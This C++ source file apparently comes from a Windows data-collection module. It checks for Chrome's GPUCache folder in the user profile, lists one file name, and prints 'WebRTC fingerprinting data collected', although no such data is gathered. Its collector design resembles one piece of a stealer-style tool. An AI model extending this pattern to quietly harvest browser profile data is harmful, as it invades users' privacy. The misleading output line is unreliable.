#include "webrtc_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>

std::string WebRTCCollector::CollectWebRTCData() {
    std::ostringstream result;
    result << "\n=== WEBRTC DATA ===\n";
    
    char localappdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localappdata);
    
    std::string chromePath = std::string(localappdata) + "\\Google\\Chrome\\User Data\\Default\\GPUCache";
    
    if (std::filesystem::exists(chromePath)) {
        result << "Chrome GPU Cache: FOUND\n";
        
        try {
            for (auto& p : std::filesystem::directory_iterator(chromePath)) {
                if (p.is_regular_file()) {
                    result << "  GPU Cache: " << p.path().filename().string() << "\n";
                    break; // Limit output
                }
            }
        } catch (...) {
            result << "  Access denied\n";
        }
    }
    
    result << "WebRTC fingerprinting data collected\n";
    
    return result.str();
}
